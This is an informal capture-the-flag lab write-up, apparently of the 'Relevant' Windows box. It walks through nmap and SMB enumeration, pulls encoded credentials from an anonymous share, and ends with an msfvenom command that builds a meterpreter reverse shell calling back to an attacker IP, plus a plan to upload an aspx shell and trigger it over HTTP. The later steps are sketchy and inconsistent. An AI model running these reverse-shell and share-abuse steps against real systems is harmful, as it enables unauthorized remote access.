┌──(kali㉿kali)-[~]
└─$ nmap -A -T4 --script vuln -p- -oN initial.nmap 10.10.213.9
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 12:07 EDT
Nmap scan report for 10.10.213.9
Host is up (0.098s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   98.22 ms 10.23.0.1
2   98.39 ms 10.10.213.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 451.48 seconds

So I immediately went for SMB, enum4linux came back with basically nothing

I did notice ports 49666 and 49668 didn't come up with any pages

┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.213.9 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.213.9 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                 
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.213.9\\nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5130352 blocks available
smb: \> cat passwords.txt
cat: command not found
smb: \> type passwords.txt
type: command not found
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> 

┌──(kali㉿kali)-[~]
└─$ cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                                

`Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$

which is great but this machine is not running SSH and I haven't found a login page from gobuster yet I can in the mean time try these credentials against the other SMB shares I found

yeah unfortunately I couldn't get into the other SMB shares

oh I should check rdp

┌──(kali㉿kali)-[~]
└─$ rdesktop 10.10.213.9:3389
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=Relevant


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=Relevant
     Issuer: CN=Relevant
 Valid From: Sun May  4 12:05:13 2025
         To: Mon Nov  3 11:05:13 2025

  Certificate fingerprints:

       sha1: 6b390024c9da71f74a456e6788b8f6c706001536
     sha256: 0b712ed6f87278c4a5a74925a9b05917fbfaf0a152d6befd0cbf6172ca9e1163


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).

can't get in with user bob or bill because I dont have the certificate

also my gobuster scan finished and found nothing

okay eventually I realized nt4wrksv was accessabile via http://10.10.155.179:49663/nt4wrksv/passwords.txt for example

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.23.80.154 LPORT=4444 -f exe -o revshell.exe by logging in via SMB with the typical smbclient //10.10.155.179/nt4wrksv -N

then when going to the URL http://10.10.155.179:49663/nt4wrksv/rev-shell.aspx

this machine kept crashing so I moved onto the next one